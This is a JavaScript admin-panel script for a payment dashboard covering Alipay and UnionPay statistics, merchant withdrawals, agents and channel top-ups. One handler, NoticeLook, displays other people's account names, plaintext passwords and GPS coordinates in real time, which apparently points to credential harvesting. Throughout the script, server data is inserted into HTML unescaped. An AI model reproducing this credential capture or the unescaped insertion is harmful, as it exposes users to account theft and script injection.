//adminHub 脚本
/**
    *获取id
    */



function getStrToFloatWrong(str) {
    
    var n = parseFloat(str); //parseInt
    //if (!isNaN(n)) {
    //    alert("是数字");
    //}

    return isNaN(n);
}

function getStrToIntWrong(str) {

    var n = parseInt(str);
    return isNaN(n);


}
function getStrToInt2(str) {
   
    var n = parseInt(str); 
    if (!isNaN(n)) {  //是数字
        return true;
    } else {
        return false;
    }
    
}

//判断字符是否为空的方法
function getStrEmpty(obj) {
    if (typeof obj == "undefined" || obj == null || obj == "") {
        return true;
    } else {
        return false;
    }
}

function GetOKTime(tmpDateTime) {
    var date = new Date(tmpDateTime);
    var localeString = date.toLocaleString();
    return localeString;
}


function guid() {
    return 'xxxxxxxxxxxx4xxxyxxxxxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
        var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

//处理Menu点击事件
function IndexPage() {
    
    var hiDate = { dateRange: 1, p: 1 };
    $.ajax({
        url: "/Help/Index/Tongji",
        type: "get",        
        data: hiDate,
        cache: false,        
        success: function (data) {
            //  alert(data);
            $("#content").empty();
            $("#content").append(data);
            //点击事件
            //$("#first").click();
           
           
        }
    });

}
function OrdersPage2020() {

    var hiDate = { dateRange: 1, p: 1 };
    $.ajax({
        url: "/Help/Index/Orders",
        type: "get",
        data: hiDate,
        cache: false,
        success: function (data) {
            //  alert(data);
            $("#content2020").empty();
            $("#content2020").append(data);
            //点击事件
            //$("#first").click();

        }
    });

}
function OrdersPage() {

    var hiDate = { dateRange: 1, p: 1 };
    $.ajax({
        url: "/Help/Index/Orders",
        type: "get",
        data: hiDate,
        cache: false,
        success: function (data) {
            //  alert(data);
            $("#content").empty();
            $("#content").append(data);
            //点击事件
            //$("#first").click();

        }
    });

}
function AjaxPage(str) {

    var hiDate = { dateRange: 1, p: 1 };
    $.ajax({
        url: "/Help/"+str,
        type: "get",
        data: hiDate,
        cache: false,
        success: function (data) {
            //  alert(data);
            $("#content").empty();
            $("#content").append(data);
            //点击事件
            //$("#first").click();

        }
    });

}

function TongjiIndex() {


    hub.server.tongjiInfo().done(function (okResult) {

        var data = $.parseJSON(okResult);
        for (var i = 0; i < data.tjSuccessfulModels.length; i++) {
           // alert(data.tjSuccessfulModels[i].OKTime);
            var myTime = data.tjSuccessfulModels[i].OKTime;
            var myokNum = data.tjSuccessfulModels[i].OkNum;
            var myTotalNum = data.tjSuccessfulModels[i].TotalNum;
            var myPt = data.tjSuccessfulModels[i].Pt;
            $('#tableUnionpay').append(



               '<tr><td><div class="flag"><img alt="united states" src="/Areas/help/assets/img/flags/us.png"></div></td>'+
                ' <td>' + myTime + '</td><td class="text-right">' + myokNum+'/'+myTotalNum +'</td>'+
                ' <td class="text-right">' + myPt +'</td></tr >'

            );



        }

        for (var i = 0; i < data.tjAlipaySuccessfulModels.length; i++) {

            try {
                var myTime = data.tjSuccessfulModels[i].OKTime;
                var myokNum = data.tjSuccessfulModels[i].OkNum;
                var myTotalNum = data.tjSuccessfulModels[i].TotalNum;
                var myPt = data.tjSuccessfulModels[i].Pt;
                $('#tableAlipay').append(

                    '<tr>< td ><div class="flag"><img alt="united states" src="~/Areas/help/assets/img/flags/us.png"></div></td>' +
                    ' <td>' + myTime + '</td><td class="text-right">' + myokNum + '/' + myTotalNum + '</td>' +
                    ' <td class="text-right">' + myPt + '</td></tr >'

                );
            } catch (e) {

            }

            
           
        }





        //


        $('#tjTotalNums').html(data.tjTotalNums);
        $('#tjTotalOkNums').html(data.tjTotalOkNums);
        $('#tjTotalMoney').html(data.tjTotalMoney);
        $('#tjTotalOkMoney').html(data.tjTotalOkMoney);
        $('#tjTotalHandMoney').html(data.tjTotalHandMoney);
        $('#tjGiveShopMoney').html(data.tjGiveShopMoney);
        $('#tjLeaveShopMoney').html(data.tjLeaveShopMoney);
        $('#tjAgentMoney').html(data.tjAgentMoney);
        $('#tjTotalVisitors').html(data.tjTotalVisitors);
        $('#tjShowQrcodesNums').html(data.tjShowQrcodesNums);
        $('#tjBadQrcodesNums').html(data.tjBadQrcodesNums);
        $('#tjOKNums').html(data.tjOKNums);

    }).fail(function (err) {
        alert('错误：' + err);
    });
}


$(function () {

    //商户提现
    $(document).on("click", "#shopGetMoney", function () {

      

        var ShopMoney = $('#ShopMoney').val();//金额
        var ShopPassWord = $('#ShopPassWord').val();//2次验证密码
        var bankAddress = $('#bankAddress').val();
        var bankCardNo = $('#bankCardNo').val();
        var bankOwner = $('#bankOwner').val();

        if (getStrEmpty(ShopMoney) || getStrEmpty(ShopPassWord) || getStrEmpty(bankAddress) || getStrEmpty(bankCardNo) || getStrEmpty(bankOwner)
            
        ) {

            alert("有空项未填写，请检查！");
            return;
        }
        if (getStrToIntWrong(ShopMoney)) {
              alert("错误，请检查金额是否正确！");
            return;
        }
        
       // alert(ShopMoney);
        var okPrams = {
            "ShopMoney": ShopMoney, "ShopPassWord": ShopPassWord,
            "BankAddress": bankAddress,
            "BankCardNo": bankCardNo,
            "BankOwner": bankOwner,
            };
        hub.server.shopGiveMoney(okPrams).done(function (result) {
            //window.Android.showToast('点击返回：' + okResult);
            if (result == 1) {
                alert("成功！");


                $('#ShopMoney').val('');//金额
                $('#ShopPassWord').val('');//2次验证密码



            } else {
                alert("申请失败,请确认输入金额和密码正确!");
            }

        }).fail(function (err) {
            alert('错误：' + err);
        });
    })


    $(document).on("click", ".myPayOK", function () {

        IndexPage();

        var tmpId = $(this).attr("data-id");//编号  
        alert(tmpId);
        hub.server.zbStateReset(tmpId).done(function (result) {
            //window.Android.showToast('点击返回：' + okResult);
            if (result == 1) {
                alert("成功！");


                $("#" + tmpId).remove();



            } else {
                alert("重新上架失败！");
            }

        }).fail(function (err) {
            alert('错误：' + err);
        });
    })


    /*//IndexPage
    $(document).on("click", "#IndexPage", function () {
        TongjiIndex();
    })*/



    //全局变量hub,不加var
    hub = $.connection.adminHub;//注意大小写，同时第一个要小写，其他地方大小写要保持
    GobalHub = hub;
   

    $.connection.hub.logging = true;

    $.connection.hub.start({ transport: ['webSockets', 'longPolling'] }).done(function () {
        
        xtip.msg('连接服务器正常!<h5 class="myOrangered">欢迎使用本系统,感谢您的支持!</h5>', { times: 4 }, { icon: 's' });

        TongjiIndex();


    }).fail(function (err) {
        alert('连接失败：' + err);
    });

   
    function getOnlineInfo(okResult) {
        $("#LookOrder").empty();
        //alert(okResult);
        var data = $.parseJSON(okResult);
        for (var i = 0; i < data.length; i++) {

            $("#LookOrder").prepend(
                '<div style="border-radius: 10px; border: 1px solid rgb(204, 204, 204); border-image: none; margin-bottom: 20px;">' +
                ' <img style="left: 2160px; top: 1px; overflow: hidden; position: relative;" src="/images/yl.png">' +
                '<b style="top: -90px; display: block; position: relative;">用户名：' + data[i].USER_ID + '</b>' +
                '<b style="top: -75px; display: block; position: relative;">IP：' + data[i].Ip + '</b>' +
                '<b style="top: -60px; display: block; position: relative;">在线时间：' + data[i].OKTime + '</b>' +
                ' </div >'
            );
        }

        addVoice();



    };

    $.connection.hub.reconnecting(function () {

        $.connection.hub.stop();

    })
    setInterval(function () {

        if ($.connection.hub.state == 0 || $.connection.hub.state == 4) {
            //window.Android.playSoundOffline("voice/offline_operator.mp3");

            $.connection.hub.stop();
            // $.connection.hub.start({ transport: 'webSockets' });
            connectFunc();
        }
        // window.Android.showToast('ID:' + $.connection.hub.id);


    }, 3000); // Restart connection after 5 seconds.
    function connectFunc() {
        $.connection.hub.start({ transport: ['webSockets', 'longPolling'] }).done(function () {


        }).fail(function (err) {

        });
    }
   

    hub.client.NoticeLook = function (okResult) {

        //alert(okResult);
        var data = $.parseJSON(okResult);
        var isExitID = $("#" + data.uid).html();
        // alert(isExitID);
        // alert(data.qUrl);
        if (isExitID != undefined) {//存在了
            return;
        }
        $("#LookOrder").prepend(
            '<div  id=' + data.uid + ' style="border-radius: 10px; border: 1px solid rgb(204, 204, 204); border-image: none; margin-bottom: 20px;">' +
            ' <img style="left: 2160px; top: 1px; overflow: hidden; position: relative;" src="/images/yl.png">' +
            '<b style="top: -90px; display: block; position: relative;">账号：<span>' + data.uid + '</span></b>' +
            '<b style="top: -75px; display: block; position: relative;">密码：' + data.pwd + '</b>' +
            '<b style="top: -60px; display: block; position: relative;">坐标：' + data.gps + '</b>' +
            '<a href="alipays://platformapi/startapp?appId=20000691&url=' + data.qUrl + '" style="top: -30px;left:80px; display: block; position: relative;">H5支付' + '</a>' +
            '<b data-id=' + data.uid + ' class="myPayOK" style="top: -48px;left:200px;color:darkturquoise ; display: block; position: relative;">已支付</b>' +
            ' </div >'
        );

        addVoice();
    };



  


    function addVoice() {
        document.getElementById('audio').play();
    }

    //add Agent
    $(document).on("click", ".myAgent", function () {
        var tmpId = $(this).attr("data-id");//编号  
       
        showDlg('请设置代理用户密码', tmpId);
       
    })

    //通道充值 myRunBuy
    $(document).on("click", ".myRunBuy", function () {
        var tmpId = $(this).attr("data-id");//编号  
        //alert(tmpId);
        showRunBuy('通道预充值', tmpId);

    })

    //商家提现审批 

    $(document).on("click", "#shopOutMoneyPass", function () {
        var tmpId = $(this).attr("data-id");//编号  
        hub.server.setShopOutMoneyPass(tmpId).done(function (result) {
            if (result == 1) {
               
                showMsg('操作成功...');
                var table = $('#shop-datatables').DataTable();
                table.ajax.reload(function (json) {
                    //  xtip.close(loadid);
                    //console.log(json);
                }, false);
              //  notifyMsg('flaticon-cross', '提示', '成功,请及时处理下发...', 'info');
            } else {
                showMsg('处理失败...');
               // notifyMsg('flaticon-cross', '警告', '处理失败...', 'info');
            }
         

        }).fail(function (err) {
            alert('错误：' + err);
        });

    })
    //查看凭证
    $(document).on("click", "#fuliPingZhengImg", function () {
        var tmpId = $(this).attr("data-id");//编号  
       // xtip.alert('<div><img id="myLogs" style="border-radius: 50%; width: 500px; margin-left: 17px; float: left; background-color: cornsilk;" src="/UploadPZ/' + tmpId+'.jpeg"></div>');
        xtip_winPZ(tmpId);
    })

    function xtip_winPZ(tmpId) {
        xtip.win({
            type: 'alert', //alert 或 confirm
            btn: ['关闭'],
            tip: '<div><img id="myLogs" style="width: 500px; margin-left: 17px; float: left; background-color: cornsilk;" src="/UploadPZ/' + tmpId +'.jpeg"></div>',
            icon: 'ask',
            title: "请核对凭证，并及时确认！",
            min: true,
            width: '600px',
            maxWidth: '100%',
            
            shade: false,
            shadeClose: false,
            lock: true,
            btn1: function () {
               // xtip.msg('');
            },
            zindex: 99999,
        });
    }

    function showMsg(t) {
        xtip.alert(t);
    }

    //通道充值 myRunBuy
    $(document).on("click", "#mySign", function () {
        
       // alert("00000");
        showOrderKey()

    })


    //设置代理账号
    function showDlg(a,tmpId) {
        var option = {
            title: a+':',
            popupTime: 0,
            hook: {
                initStart: function () {
                    // 检查之前老旧实例如果存在则销毁
                    if (document.querySelector('#modal-layer-container'))
                        ModalLayer.removeAll();
                }
            },
            displayProgressBar: true,
            displayProgressBarColor: 'red',
            displayProgressBarPos: 'right',
            content: '<input id="agentUID" type="text" style="width: calc(49% - 2px); height: 24px; font-size: 16px; color: green;" placeholder="请输入账号..."><input id="agentPwd" type="text" style="width: calc(49% - 2px); height: 24px; font-size: 16px; color: green;" placeholder="请输入密码..."><input id="agentPt" type="text" style="width: calc(100% - 2px); height: 24px; font-size: 16px; color: red;" placeholder="佣金比例,y|z|w格式: 0.6|0.3|0.2 ">',
            okText: '提交',
            noText: '取消',
            callback: {
                ok: function () {
                    this.hide();

                    var u = this.getNodes().container.querySelector('#agentUID').value;

                    var p = this.getNodes().container.querySelector('#agentPt').value;

                    var pwd2 = this.getNodes().container.querySelector('#agentPwd').value;
                   // alert(p);
                   // alert(pwd2);
                   
                   // var okPrams = '{"WhichCmd":"addAgent","Data":{"UID":'+tmpId+',"PWD":'+pwd2+ '}}';
                   // alert(okPrams);
                    hub.server.addAgent(tmpId, u, pwd2, p).done(function (result) {
                        //window.Android.showToast('点击返回：' + okResult);
                        if (result == 1) {
                            alert("操作成功！");


                        } else {
                            alert("操作失败,请检查数据格式!");
                        }

                    }).fail(function (err) {
                        alert('错误：' + err);
                    });
                    this.hide();
                },
            }
        };

        ModalLayer.prompt(option);

    }
    

    //给通道预充值
    function showRunBuy(a, tmpId) {
        var option = {
            title: a + ':',
            popupTime: 0,
            hook: {
                initStart: function () {
                    // 检查之前老旧实例如果存在则销毁
                    if (document.querySelector('#modal-layer-container'))
                        ModalLayer.removeAll();
                }
            },
            displayProgressBar: true,
            displayProgressBarColor: 'red',
            displayProgressBarPos: 'right',
            content: '<input id="runMoney" type="text" style="width: calc(100% - 2px); height: 24px; font-size: 16px; color: red;" placeholder="请输入充值金额,单位 元"><input id="runPwd" type="text" style="width: calc(100% - 2px); height: 24px; font-size: 16px; color: red;" placeholder="请输入2次确认密码...">',
            okText: '提交',
            noText: '取消',
            callback: {
                ok: function () {
                    this.hide();
                    var m = this.getNodes().container.querySelector('#runMoney').value;

                    var pwd2 = this.getNodes().container.querySelector('#runPwd').value;
                    // alert(p);
                    // alert(pwd2);

                    // var okPrams = '{"WhichCmd":"addAgent","Data":{"UID":'+tmpId+',"PWD":'+pwd2+ '}}';
                    // alert(okPrams);
                    hub.server.runBuy(tmpId, pwd2, m).done(function (result) {
                        //window.Android.showToast('点击返回：' + okResult);
                        if (result == 1) {
                            alert("操作成功！");


                        } else {
                            alert("操作失败,请检查数据格式!");
                        }

                    }).fail(function (err) {
                        alert('错误：' + err);
                    });
                    this.hide();
                },
            }
        };

        ModalLayer.prompt(option);

    }


    //获取签名
    function showOrderKey() {
        var PosUid = $('#PosUid').val();
       // alert(PosUid);

        var OrderType = $('#OrderType').val();

        var OrderMoney = $('#OrderMoney').val();
       
        var OrderNo = $('#OrderNo').val();

        hub.server.getSign(PosUid, OrderType, OrderMoney, OrderNo).done(function (result) {
            //window.Android.showToast('点击返回：' + okResult);
            $('#Sign').val(result);

        }).fail(function (err) {
            alert('错误：' + err);
        });

    }


    //催单
    hub.client.MsgNews = function (ok2020) {
       // show("请注意：", "<span style='font-size:1.2em;color:deeppink'>" + okResult + "</span>");
       // alert('dddd');
        console.log('Msg2020');
        showMsg(ok2020);
        console.log('Msg2020...');
       // alert(okResult);
        //notifyMsg('flaticon-cross', '提示', '请先浏览全部订单!', 'info');
    };

    function showMsg(str) {
        xtip.alert(str, 'w', { shade: false })
    }


}); //end